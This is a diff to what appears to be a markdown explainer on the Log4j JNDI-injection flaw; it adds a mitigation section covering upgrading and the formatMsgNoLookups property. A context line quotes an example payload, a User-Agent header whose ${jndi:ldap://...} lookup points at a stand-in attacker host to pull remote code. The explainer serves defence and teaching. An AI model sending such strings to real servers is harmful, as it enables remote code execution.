@@ -28,3 +28,14 @@ User-Agent: ${jndi:ldap://attacker.com/a}
 
 - ### Execute Malicious Code:
   The attacker’s LDAP server responds with a reference to a malicious Java class. When the application loads this class, it executes arbitrary code on the server, leading to a full compromise.
+
+## MITIGATION
+
+- ### Upgrade Log4j:
+  Update to the latest version of Log4j (2.15.0 or later) where the vulnerability is patched.
+
+- ### Remove JNDI Lookup Feature:
+- If upgrading is not immediately possible, consider disabling the JNDI lookup feature by setting the system property:
+```text
+log4j2.formatMsgNoLookups=true
+```
